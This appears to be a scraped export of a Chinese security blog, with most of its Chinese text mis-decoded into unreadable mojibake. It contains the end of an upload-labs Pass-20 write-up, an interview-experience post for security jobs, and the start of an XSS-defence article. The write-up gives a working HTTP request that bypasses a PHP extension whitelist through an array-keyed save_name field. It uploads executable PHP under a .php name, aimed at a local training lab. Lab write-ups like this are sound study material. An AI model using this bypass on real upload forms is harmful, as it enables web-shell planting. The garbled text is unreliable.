//æ£€æŸ¥æ–‡ä»¶å  $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\u0026#34;; }else{ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\u0026#34;; } } } }else{ $msg = \u0026#34;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼\u0026#34;; } è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨äº†ä¸€ä¸ªendä¸countçš„å‡½æ•°ç‰¹æ€§ï¼Œæ ¹æ® php æ–‡æ¡£\n â€‹\tend\n(PHP 4, PHP 5, PHP 7)\nend â€” å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ\nâ€‹\tcount\n(PHP 4, PHP 5, PHP 7)\ncount â€” è®¡ç®—æ•°ç»„ä¸­çš„å•å…ƒæ•°ç›®ï¼Œæˆ–å¯¹è±¡ä¸­çš„å±æ€§ä¸ªæ•°\n è¿™é‡Œæˆ‘ä»¬å°±çœ‹å¾—æ›´æ¸…æ¥šäº†ï¼Œendå–çš„æ˜¯æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæ— è®ºä¸‹æ ‡æ˜¯ä»€ä¹ˆï¼Œè€Œcount($arr)-1å–çš„æ˜¯ä¸‹æ ‡ä¸ºä¸ºæœ€åçš„å…ƒç´ ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ®µä»£ç \n\u0026lt;?php $arr = array(\u0026#34;0\u0026#34;=\u0026gt;\u0026#34;jpg\u0026#34;, \u0026#34;2\u0026#34;=\u0026gt;\u0026#34;php\u0026#34;, \u0026#34;1\u0026#34;=\u0026gt;\u0026#34;jpg\u0026#34;); var_dump(end($arr)); var_dump($arr[count($arr) - 1]); string(3) \u0026#34;jpg\u0026#34; string(3) \u0026#34;php\u0026#34; æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é¡ºåºä¸æ˜¯æŒ‰ç…§å¯»å¸¸çš„é¡ºåºçš„ï¼Œæˆ‘ä»¬æ•…æ„æŠŠæœ€åä¸€ä¸ªå…ƒç´ æ’åœ¨äº†å‰é¢ä¸€ä½çš„è¯ï¼Œè¿™æ ·endå°±å–åˆ°äº†jpgåç¼€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨$_POST[save_name]æ¥ç»•è¿‡æœ€ååç¼€æ£€æµ‹äº†\nPOST /Pass-20/index.php?action=show_code HTTP/1.1 Host: localhost:8002 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost:8002/Pass-20/index.php?action=show_code Content-Type: multipart/form-data; boundary=---------------------------137136829317924008472127919060 Content-Length: 617 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------137136829317924008472127919060 Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;info.jpg\u0026#34; Content-Type: image/gif \u0026lt;?php phpinfo(); ?\u0026gt; -----------------------------137136829317924008472127919060 Content-Disposition: form-data; name=\u0026#34;save_name[1]\u0026#34; upload-20.php -----------------------------137136829317924008472127919060 Content-Disposition: form-data; name=\u0026#34;save_name[0]\u0026#34; jpg -----------------------------137136829317924008472127919060 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; ä¸Šä¼  -----------------------------137136829317924008472127919060-- è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œsave_name[0]æ”¾jpgå°±å¥½äº†ï¼Œå¦åˆ™$extæ‹¿åˆ°çš„æ˜¯upload-20.jpgï¼Œè¿™æ ·æ•´ä¸ªå­—ç¬¦ä¸²å°±ä¼šè¿›å…¥!in_array($ext, $allow_suffix)è¿™ä¸ªåˆ¤æ–­é‡Œé¢äº†ã€‚\n \nConclusion è¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºå¥½çš„ï¼Œæ€»ç»“å¾—éƒ½ç›¸å½“ä¸é”™ã€‚å¦‚æœèƒ½é…åˆæ›´å¤šçš„ä¸­é—´ä»¶è§£ææ¼æ´æ¥åšçš„è¯ä¼šæ›´æ£’ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åšåˆ°çš„ä»…ä»…æ˜¯ä¸Šä¼ ä¸€ä¸ª jpg å•¥çš„ï¼Œå¦‚æœé…åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ‰©å¤§æ€ä¼¤åŠ›ã€‚\n \n","date":"2019-03-18T19:48:17Z","permalink":"https://blog.zeddyu.info/2019/03/18/UploadLab-WriteUp/","title":"UploadLab WriteUp"},{"content":"è¿™ç¯‡å†™ä¸€ä¸‹æœ€è¿‘çš„ç¬”è¯•é¢è¯•ç»éªŒ\næœ€è¿‘æŠ•äº†360ã€è…¾è®¯ã€é˜¿é‡Œã€åä¸ºï¼Œå…¨éƒ½æ˜¯å®‰å…¨æŠ€æœ¯å²—ã€‚\n360 ç¬”è¯• æŠ•çš„æ˜¯ Web å®‰å…¨å·¥ç¨‹å¸ˆï¼Œæˆ‘åªæ”¶åˆ°äº†èƒ½åŠ›ç¬”è¯•çš„é‚€è¯·\u0026hellip;å¬è¯´è¿˜æœ‰æŠ€æœ¯ç¬”è¯•ï¼Œç„¶è€Œæˆ‘å¹¶æ²¡æœ‰æ”¶åˆ°é‚€è¯·\u0026hellip;\nèƒ½åŠ›ç¬”è¯•æœ‰30ä¸ªé¢˜ï¼Œæ—¶é™30minï¼Œ15ä¸ªæ•°ç†é€»è¾‘ï¼Œ15ä¸ªä»€ä¹ˆåæƒ…å•†çš„é¢˜ç›®ã€‚\nä¸€å®šè¦å‡†å¤‡å¥½ç¬”çº¸ï¼Œæ•°ç†é€»è¾‘é¢˜ä¼šæœ‰æ–¹ç¨‹å•¥çš„è®¡ç®—é¢˜ï¼Œæ•°ç†é€»è¾‘å­—é¢æ„æ€ï¼Œéƒ½æ˜¯æ•°ç†é€»è¾‘çš„é¢˜ç›®ï¼Œæ¯”å¦‚è¯´æ•°å­¦é¢˜ï¼Œå‡ ä¸ªäººè¯´ä¸€å¥è¯å…¶ä¸­ä¸€ä¸ªäººè¯´å‡è¯åˆ¤æ–­æ˜¯è°çš„è¿™ç§é¢˜ç›®ï¼Œå»ºè®®å‰20minåšæ•°ç†é€»è¾‘ï¼Œè™½ç„¶å‰©ä¸‹15ä¸ªæ¯”è¾ƒç®€å•ï¼Œä¸éœ€è¦ä»€ä¹ˆè®¡ç®—ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€äº›æ¯”è¾ƒè€—æ—¶é—´çš„æ¦‚å¿µé¢˜è®©ä½ å»è¯»é¢˜å¹²ã€‚\nå¾ˆé—æ†¾è¿™é‡Œæ²¡æœ‰å‡†å¤‡å……åˆ†ï¼Œå£ç®—æ–¹ç¨‹å¯¼è‡´æ²¡è¿‡ç¬”è¯•\u0026hellip;\nè…¾è®¯ æŠ•çš„æ˜¯å®‰å…¨æŠ€æœ¯ï¼ŒCSIG äº‹ä¸šç¾¤\nç¬¬ä¸€æ¬¡ä¸€é¢ æ”¶åˆ°çš„ä¸€é¢ç«Ÿç„¶æ˜¯åå°ç­–ç•¥å®‰å…¨â€¦ç„¶åå»çœ‹äº†å¾ˆå¤šæ³¨å…¥ç›¸å…³çš„çŸ¥è¯†ï¼Œç»“æœä¸€é¢åŸºæœ¬æ²¡é—®ä»€ä¹ˆæŠ€æœ¯é¢˜â€¦ï¼ˆæ„Ÿè§‰æ˜¯ HR é¢çš„\n é¦–å…ˆä¸Šæ¥é—®ä½ çš„å®ä¹ ç»éªŒï¼ˆå› ä¸ºæˆ‘æœ‰å†™ï¼Œæ¯”è¾ƒè‡ªè±ªåœ°ç­”äº†è‡ªå·±çš„å®ä¹ ç»å† é—®è¿ç»´ç»éªŒ é—®å®¢æˆ·ç«¯å¼€å‘ é—®æœ€åŸºæœ¬çš„åŒºåˆ«é—®é¢˜ï¼ˆTCP/UDPåŒºåˆ« é—®å®ä¹ æ—¶é—´ é—®è‡ªå·±çš„æ„å‘ï¼ˆè‡ªå·±ä¹Ÿå¦‚å®ç­”äº†ï¼Œè¯´è‡ªå·±åŸæœ¬æƒ³å»äº‘é¼å®éªŒå®¤ä»€ä¹ˆçš„â€¦ç„¶åè¯´äº†ä¸€äº›æœ‰çš„æ²¡çš„ï¼Œç„¶åå¯¹æ–¹ä¹Ÿè¯´ä»–ä»¬éƒ¨é—¨æ˜¯åå°å¼€å‘çš„\u0026hellip; é—®åçˆ¬è™«ï¼ˆä¹Ÿæ˜¯èŠå¾—æ¯”è¾ƒå¤šçš„ä¸€å—äº†  æ•´ä¸ªé¢è¯•æµç¨‹ä¼°è®¡æ²¡æœ‰10minï¼Œé¡¶å¤š15minå·¦å³â€¦è™½ç„¶å¯¹æ–¹è¯´ä¼šç»™åŒäº‹çœ‹ï¼Œè®©æˆ‘ç­‰é¢è¯•é€šçŸ¥\u0026hellip;è¡¨é¢æ„Ÿè§‰ä¸€é¢è¿‡äº†\u0026hellip;ä½†æ˜¯åæ¥æƒ³èµ·æ¥é¢è¯•æ—¶é—´çœŸçš„æ˜¯çŸ­\u0026hellip;å°±æœ‰ç‚¹åæ€•\u0026hellip;\nåŸºæœ¬å°±è¿™äº›äº†å§ï¼ŒäºŒé¢å†æ›´å§ã€‚ï¼ˆå¦‚æœæœ‰äºŒé¢çš„è¯â€¦å¸Œæœ›æœ‰å§\u0026hellip;\nç¬¬äºŒæ¬¡ä¸€é¢ ç¬¬ä¸€æ¬¡ä¸€é¢å¾ˆå¼€å¿ƒåœ°å‡‰äº†ï¼Œé‡æ–°è¢«æ”¾å›ç®€å†æ± ï¼Œå¥½å‡ å¤©éƒ½æ²¡äººææˆ‘ã€‚\nç›´åˆ°è‡ªå·±æŠ•çš„è…¾è®¯å®‰å…¨å¹³å°éƒ¨åœ¨ 3/20 æ™šä¸Šçªç„¶æ‰“ç”µè¯ç»™æˆ‘ï¼Œè‡ªå·±æ‰‹æœºæ˜¾ç¤ºæ˜¯\u0026quot;QQè¿”åˆ©\u0026quot;çš„ç”µè¯ï¼Œè¿˜å·®ç‚¹å°±æƒ³æŒ‚äº†â€¦è¿˜å¥½æ²¡æŒ‚ï¼Œå¦åˆ™å°±çœŸé”™è¿‡äº†\u0026hellip;\nä¸€ä¸Šæ¥ç›´æ¥å¼€å§‹ç¬¬äºŒæ¬¡ä¸€é¢ï¼Œå†…å®¹ä¸å¤ªè®°å¾—æ¸…æ¥šäº†ï¼Œç¨æœ‰å°è±¡çš„æ˜¯é—®äº† phar ååºåˆ—åŒ–çš„åŸç†ä»¥åŠ DNS rebinding æ”»é˜²æ–¹æ³•ï¼Œè¿˜æœ‰ Docker layer çš„æ„æˆï¼ˆè‡ªå·±ç®€å†æœ‰å†™ï¼‰ï¼Œå…¶ä»–å°±è®°å¾—ä¸æ˜¯éå¸¸æ¸…æ¥šäº†ï¼Œè²Œä¼¼éƒ½ä¸æ˜¯å¾ˆéš¾ã€‚\nç¬¬äºŒæ¬¡äºŒé¢ æ¥ç€ç¬¬äºŒæ¬¡ä¸€é¢ï¼Œé—´éš”ä¸è¶…è¿‡ 5min ï¼Œåˆšåä¸‹ä¸ä¹…å°±æ”¶åˆ°äº†äºŒé¢çš„ç”µè¯\u0026hellip;\nä¸€ä¸Šæ¥å°±é—®äº† Javascript é—­åŒ…é—®é¢˜ï¼Œç›´æ¥è¯´å¿˜äº†ã€‚ç„¶åé—®äº† bypass disable_function çš„é—®é¢˜ï¼Œä½†æ˜¯ä»–é—®çš„æ˜¯ç»•è¿‡ php æ²™ç®±é‚£é‡Œä¸€ç±»ååº•å±‚åˆ†æçš„â€¦è¯¸å¦‚ç»™ä½ ä¸€ä¸ª webshell ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªç¯å¢ƒè°ƒç”¨äº†æ±¡ç‚¹åˆ†æç¦æ­¢æ‰§è¡Œä¸€äº›å±é™©å‘½ä»¤ï¼Œæ€ä¹ˆç»•è¿‡è¿™ä¸ªæœºåˆ¶\u0026hellip;å½“æ—¶å°±ç»™è·ªäº†â€¦ç›´æ¥è¯´è¶…å‡ºäº†è‡ªå·±çš„çŸ¥è¯†èŒƒå›´\u0026hellip;(è€Œä¸”è²Œä¼¼è¿™ç§å®‰å…¨æœºåˆ¶ï¼Œç›®å‰è‡ªå·±æ¥è§¦åˆ°çš„æ¸—é€ç›®æ ‡è¿˜æ²¡ç¢°åˆ°è¿‡ç±»ä¼¼çš„è¿™ä¹ˆé«˜ç­‰çº§çš„å®‰å…¨é˜²æŠ¤æœºåˆ¶\u0026hellip;)\næ¥ç€é—®äº†æ¯”è¾ƒåŸºç¡€çš„æ”»å‡»æ–¹æ³•ï¼ŒSSRF æ”»é˜²æ–¹å¼ï¼Œå› ä¸ºé¢æˆ‘çš„æ˜¯ä¸ªåäºŒè¿›åˆ¶çš„å¸¦å›¢é˜Ÿçš„ Leader å‹çš„äººç‰©ï¼Œæ„Ÿè§‰å·²ç»å¾ˆä¹…æ²¡ç¢° Web å®‰å…¨æ–¹é¢çš„äº†ï¼Œé¢çš„å…³äº Web çš„ä¸æ˜¯å¾ˆæ·±ã€‚é—®äº†ç¼–è¯‘åŸç†è¯­æ³•åˆ†æçš„ä½œç”¨ç­‰ã€‚è¿˜é—®äº†è‡ªå·±ä¸ºå•¥é€‰æ‹©æ Web å®‰å…¨\u0026hellip;\nåŸºæœ¬è¿˜æ˜¯æ¯”è¾ƒå¥½ç­”çš„ï¼Œä¸æ˜¯ç‰¹åˆ«åˆéš¾ã€‚é¢çš„ä¹Ÿæ¯”è¾ƒèˆ’æœã€‚\nç¬¬äºŒæ¬¡ä¸‰é¢ ç¬¬äºŒæ¬¡äºŒé¢éš”äº†5å¤©å·¦å³ï¼Œå¾ˆå¹¸è¿åœ°åœ¨ä¸€å¤©ä¸­åˆæ¥åˆ°äº†æ¥è‡ªè…¾è®¯æ·±åœ³æ€»éƒ¨ HR çš„é¢è¯•ç”µè¯ï¼Œé—®äº†è‡ªå·±æ„å‘å·¥ä½œåœ°ï¼Œä»¥åå‘å±•ï¼Œæƒ³ä¸æƒ³å·¥ä½œå•¥çš„ï¼ŒåŸºæœ¬æ²¡ä»€ä¹ˆåˆéš¾çš„é—®é¢˜ï¼Œæœ€åå£å¤´é€šçŸ¥ç»™äº† offer ğŸ˜„\næ€»ç»“ æ€»åœ°æ¥è¯´ï¼Œè¿æ°”æ¯”è¾ƒå¥½ï¼Œè…¾è®¯é¢è¯•å¼‚å¸¸çš„é¡ºåˆ©ï¼Œé¢å¾—ä¹Ÿæ¯”è¾ƒè½»æ¾ï¼Œå¹¸è¿åœ°æ‹¿åˆ°äº†è…¾è®¯å®‰å¹³çš„ offer ï¼Œè™½ç„¶æ²¡æœ‰å»ä¸ƒå¤§å®éªŒå®¤ï¼Œä½†æ˜¯è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ï½\né˜¿é‡Œ èƒ½åŠ›æµ‹è¯„ 10ä¸ªé˜…è¯»ç†è§£ï¼Œ10ä¸ªæ‰¾è§„å¾‹ï¼Œ10ä¸ªç®€å•çš„æ•°å­¦é¢˜\nå…¶ä½™éƒ½æ˜¯è‡ªæˆ‘è¯„ä»·ç±»ï¼Œæ¯”å¦‚ä½ è§‰å¾—ä½ çš„ä¼˜ç‚¹æ¯”ç¼ºç‚¹å¤šï¼Œç»™5ä¸ªé€‰é¡¹\n å®Œå…¨ä¸ç¬¦åˆ æ¯”è¾ƒä¸ç¬¦åˆ ä¸€èˆ¬ç¬¦åˆ æ¯”è¾ƒç¬¦åˆ å®Œå…¨ç¬¦åˆ  é€‰äº†ä¼°è®¡æœ‰100æ¥é“é¢˜ï¼Œå…¶ä¸­æœ‰é‡å¤çš„é¢˜ç›®ï¼Œä¼°è®¡è€ƒçš„æ˜¯ä½ è®°å¿†æˆ–è€…æ˜¯å¦å‰åä¸€è‡´çš„æƒ…å†µã€‚\nåæ§½ è¿™é‡Œå°±ä¸å¾—ä¸åæ§½é˜¿é‡Œäº†â€¦æˆ‘è…¾è®¯éƒ½æ‹¿åˆ°äº† offer ï¼Œé˜¿é‡Œçš„çŠ¶æ€åœ¨æˆ‘ç­”å®Œæµ‹è¯„åçš„ä¸¤ä¸ªå‘¨è¿˜æ˜¯\u0026quot;é¢è¯•ä¸­\u0026quot;çš„çŠ¶æ€ï¼Œç„¶è€Œå´æ²¡æœ‰ä»»ä½•é¢è¯•é€šçŸ¥â€¦ä¼°è®¡è¿™çŠ¶æ€ä¼šæŒç»­æ›´ä¹…\u0026hellip;\nç­‰äº†å¾ˆä¹…ï¼Œç»“æœè¿ç®€å†ç­›éƒ½æ²¡è¿‡hhhâ€¦\nåä¸º æŠ•çš„æ˜¯æ”»é˜²/æµ‹è¯•ï¼Œç ”å‘ä¸­å¿ƒå²—ä½\næœºè¯• æ”»é˜²å²—çš„æœºè¯•ä¸ä½œä¸ºå¦å†³æ¡ä»¶ï¼Œåªä½œå‚è€ƒï¼Œæœºè¯•ä¸€å…±ä¸‰é¢˜ã€‚\nç¬¬ä¸€é¢˜ ç¬¬ä¸€é¢˜ç®€å•çš„å°†å°ç«¯å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§ç«¯å­—ç¬¦ä¸²ã€‚\næ¯”å¦‚012345678ï¼Œç¬¬ä¸€ä½å­—ç¬¦ä»£è¡¨æ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯ï¼Œ0 ä»£è¡¨å°ç«¯ï¼Œéœ€è¦é€†åºè¾“å‡ºæ¥ä¸‹æ¥çš„å…«ä½ï¼Œæ¯”å¦‚è¿™é‡Œè¾“å‡º 87654321ï¼›1 ä»£è¡¨å¤§ç«¯ï¼Œç›´æ¥åŸæ ·è¾“å‡ºå°±è¡Œï¼Œæ¯”å¦‚ 112345678 ï¼Œè¾“å‡º 12345678 å³å¯ã€‚\næ²¡ä»€ä¹ˆéš¾åº¦ã€‚\nç¬¬äºŒé¢˜ åœ¨ä¸€ä¸ªäºŒç»´å¹³é¢åæ ‡ç³»ï¼Œç»™å®šäº”ä¸ªåæ ‡ï¼Œæ±‚ä»åŸç‚¹ä¾æ¬¡ç»è¿‡è¿™äº”ä¸ªç‚¹ï¼Œæœ€åå›åˆ°åŸç‚¹çš„æœ€çŸ­è·ç¦»ã€‚\nç¬¬ä¸‰é¢˜ åˆ‡æ°´æœé¢˜\u0026hellip;\næ€»ç»“ ç®—æ³•å¤ªèœï¼Œæ²¡ä»€ä¹ˆå¥½æ€»ç»“çš„ã€‚\nèƒ½åŠ›æµ‹è¯„ è·Ÿé˜¿é‡Œçš„ä¸€æ ·ï¼Œä¹Ÿæ˜¯å¾ˆå¤šé“å…³äºè‡ªèº«è¯„æµ‹çš„é€‰æ‹©é¢˜ï¼Œæ¯”è¾ƒè€—æ—¶é—´\né¢è¯• é¢è¯•åˆ†ä¸ºä¸¤å—é¢è¯•ï¼Œä¸€å—æ˜¯ä¸šåŠ¡é¢ï¼Œä¸€å—æ˜¯ç»¼åˆé¢ã€‚\nä¸šåŠ¡é¢è·Ÿç»¼åˆé¢éƒ½æ¯”è¾ƒæ°´ï¼Œå¯èƒ½é¢çš„éƒ¨é—¨æœ‰å­¦é•¿çš„å…³ç³»ï¼Œéƒ½æ²¡æ€ä¹ˆé—®æŠ€æœ¯é—®é¢˜ï¼Œéšä¾¿é—®äº†ä¸€ä¸‹å°±æ²¡äº†ã€‚\n","date":"2019-03-14T21:46:19Z","permalink":"https://blog.zeddyu.info/2019/03/14/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/","title":"é¢è¯•ç»éªŒåˆ†äº«"},{"content":"è¿™æ˜¯è‡ªå·±å†™çš„ Web å®‰å…¨ä»é›¶å¼€å§‹ç³»åˆ—ä¹‹ XSS ç¯‡ã€‚ç¬¬å››ç¯‡è®² XSS é˜²å¾¡ã€‚\n[TOC]\nDefend æ— è®ºæ˜¯æœåŠ¡ç«¯å‹è¿˜æ˜¯å®¢æˆ·ç«¯å‹xssï¼Œæ”»å‡»è¾¾æˆéƒ½éœ€è¦ä¸¤ä¸ªæ¡ä»¶\n ä»£ç è¢«æ³¨å…¥ ä»£ç è¢«æ‰§è¡Œ  å…¶å®åªè¦åšå¥½æ— è®ºä»»ä½•æƒ…å†µä¸‹ä¿è¯ä»£ç ä¸è¢«æ‰§è¡Œå°±èƒ½å®Œå…¨æœç» xss æ”»å‡».\næ€»ä¹‹, ä»»ä½•æ—¶å€™éƒ½ä¸è¦æŠŠä¸å—ä¿¡ä»»çš„æ•°æ®ç›´æ¥æ’å…¥åˆ° dom ä¸­çš„ä»»ä½•ä½ç½®, ä¸€å®šè¦åšè½¬ä¹‰ã€‚\nå¯¹äºæŸäº›ä½ç½®,ä¸å—ä¿¡ä»»çš„æ•°æ®åšè½¬ä¹‰å°±å¯ä»¥ä¿è¯å®‰å…¨\n ä¸€èˆ¬çš„æ ‡ç­¾å±æ€§å€¼(éäº‹ä»¶å±æ€§) div body çš„å†…éƒ¨html  å¯¹äºæŸäº›ä½ç½®ï¼Œå³ä½¿åšäº†è½¬ä¹‰ä¾ç„¶ä¸å®‰å…¨\n scriptæ ‡ç­¾ä¸­ æ³¨é‡Šä¸­ è¡¨ç­¾çš„å±æ€§åå æ ‡ç­¾å cssæ ‡ç­¾ä¸­  ä½¿ç”¨ JSON.parse è€Œä¸æ˜¯eval, request çš„content-typeè¦æŒ‡å®šæ˜¯Content-Type: application/json;\nå¦‚æœé“¾æ¥çš„URLä¸­éƒ¨åˆ†æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¸€å®šè¦åšè½¬ä¹‰ã€‚\nSeven Principles åŸåˆ™1ï¼šä¸è¦åœ¨é¡µé¢ä¸­æ’å…¥ä»»ä½•ä¸å¯ä¿¡æ•°æ®ï¼Œé™¤éè¿™äº›æ•°å·²ç»æ®æ ¹æ®ä¸‹é¢å‡ ä¸ªåŸåˆ™è¿›è¡Œäº†ç¼–ç  ç¬¬ä¸€æ¡åŸåˆ™å…¶å®æ˜¯â€œSecure By Defaultâ€åŸåˆ™ï¼šä¸è¦å¾€HTMLé¡µé¢ä¸­æ’å…¥ä»»ä½•ä¸å¯ä¿¡æ•°æ®ï¼Œé™¤éè¿™äº›æ•°æ®å·²ç»æ ¹æ®ä¸‹é¢å‡ æ¡åŸåˆ™è¿›è¡Œäº†ç¼–ç ã€‚\nä¹‹æ‰€ä»¥æœ‰è¿™æ ·ä¸€æ¡åŸåˆ™å­˜åœ¨ï¼Œæ˜¯å› ä¸º HTML é‡Œæœ‰å¤ªå¤šçš„åœ°æ–¹å®¹æ˜“å½¢æˆXSSæ¼æ´ï¼Œè€Œä¸”å½¢æˆæ¼æ´çš„åŸå› åˆæœ‰å·®åˆ«ï¼Œæ¯”å¦‚æœ‰äº›æ¼æ´å‘ç”Ÿåœ¨HTMLæ ‡ç­¾é‡Œï¼Œæœ‰äº›å‘ç”Ÿåœ¨HTMLæ ‡ç­¾çš„å±æ€§é‡Œï¼Œè¿˜æœ‰çš„å‘ç”Ÿåœ¨é¡µé¢çš„\u0026lt;Script\u0026gt;é‡Œï¼Œç”šè‡³æœ‰äº›è¿˜å‡ºç°åœ¨CSSé‡Œï¼Œå†åŠ ä¸Šä¸åŒçš„æµè§ˆå™¨å¯¹é¡µé¢çš„è§£ææˆ–å¤šæˆ–å°‘æœ‰äº›ä¸åŒï¼Œä½¿å¾—æœ‰äº›æ¼æ´åªåœ¨ç‰¹å®šæµè§ˆå™¨é‡Œæ‰ä¼šäº§ç”Ÿã€‚å¦‚æœæƒ³è¦é€šè¿‡XSSè¿‡æ»¤å™¨ï¼ˆXSS Filterï¼‰å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡Œè½¬ä¹‰æˆ–æ›¿æ¢ï¼Œé‚£ä¹ˆXSSè¿‡æ»¤å™¨çš„è¿‡æ»¤è§„åˆ™å°†ä¼šå˜å¾—å¼‚å¸¸å¤æ‚ï¼Œéš¾ä»¥ç»´æŠ¤è€Œä¸”ä¼šæœ‰è¢«ç»•è¿‡çš„é£é™©ã€‚\næ‰€ä»¥å®åœ¨æƒ³ä¸å‡ºæœ‰ä»€ä¹ˆç†ç”±è¦ç›´æ¥å¾€HTMLé¡µé¢é‡Œæ’å…¥ä¸å¯ä¿¡æ•°æ®ï¼Œå°±ç®—æ˜¯æœ‰XSSè¿‡æ»¤å™¨å¸®ä½ åšè¿‡æ»¤ï¼Œäº§ç”ŸXSSæ¼æ´çš„é£é™©è¿˜æ˜¯å¾ˆé«˜\n\u0026lt;script\u0026gt;â€¦ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ®â€¦\u0026lt;/script\u0026gt;ç›´æ¥æ’å…¥åˆ°SCRIPTæ ‡ç­¾é‡Œ \u0026lt;!â€“ â€¦ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ®â€¦ â€“\u0026gt; æ’å…¥åˆ°HTMLæ³¨é‡Šé‡Œ \u0026lt;div ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ®=â€â€¦â€\u0026gt;\u0026lt;/div\u0026gt; æ’å…¥åˆ°HTMLæ ‡ç­¾çš„å±æ€§åé‡Œ \u0026lt;div name=â€â€¦ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ®â€¦â€\u0026gt;\u0026lt;/div\u0026gt; æ’å…¥åˆ°HTMLæ ‡ç­¾çš„å±æ€§å€¼é‡Œ \u0026lt;ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ® href=â€â€¦â€\u0026gt;\u0026lt;/a\u0026gt; ä½œä¸ºHTMLæ ‡ç­¾çš„åå­— \u0026lt;style\u0026gt;â€¦ä¸è¦åœ¨è¿™é‡Œç›´æ¥æ’å…¥ä¸å¯ä¿¡æ•°æ®â€¦\u0026lt;/style\u0026gt; ç›´æ¥æ’å…¥åˆ°CSSé‡Œ æœ€é‡è¦çš„æ˜¯ï¼Œåƒä¸‡ä¸è¦å¼•å…¥ä»»ä½•ä¸å¯ä¿¡çš„ç¬¬ä¸‰æ–¹ JavaScript åˆ°é¡µé¢é‡Œï¼Œä¸€æ—¦å¼•å…¥äº†ï¼Œè¿™äº›è„šæœ¬å°±èƒ½å¤Ÿæ“çºµä½ çš„HTMLé¡µé¢ï¼Œçªƒå–æ•æ„Ÿä¿¡æ¯æˆ–è€…å‘èµ·é’“é±¼æ”»å‡»ç­‰ç­‰ã€‚\nåŸåˆ™2ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç  åœ¨è¿™é‡Œç›¸å½“å¼ºè°ƒæ˜¯å¾€HTMLæ ‡ç­¾ä¹‹é—´æ’å…¥ä¸å¯ä¿¡æ•°æ®ï¼Œä»¥åŒºåˆ«äºå¾€HTMLæ ‡ç­¾å±æ€§éƒ¨åˆ†æ’å…¥ä¸å¯ä¿¡æ•°æ®ï¼Œå› ä¸ºè¿™ä¸¤è€…éœ€è¦è¿›è¡Œä¸åŒç±»å‹çš„ç¼–ç ã€‚å½“ä½ ç¡®å®éœ€è¦å¾€HTMLæ ‡ç­¾ä¹‹é—´æ’å…¥ä¸å¯ä¿¡æ•°æ®çš„æ—¶å€™ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡ŒHTML Entityç¼–ç ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¾€DIVï¼ŒPï¼ŒTDè¿™äº›æ ‡ç­¾é‡Œæ”¾å…¥ä¸€äº›ç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®æ˜¯ä¸å¯ä¿¡çš„ï¼Œéœ€è¦å¯¹å®ƒä»¬è¿›è¡ŒHTML Entityç¼–ç ã€‚å¾ˆå¤šWebæ¡†æ¶éƒ½æä¾›äº†HTML Entityç¼–ç 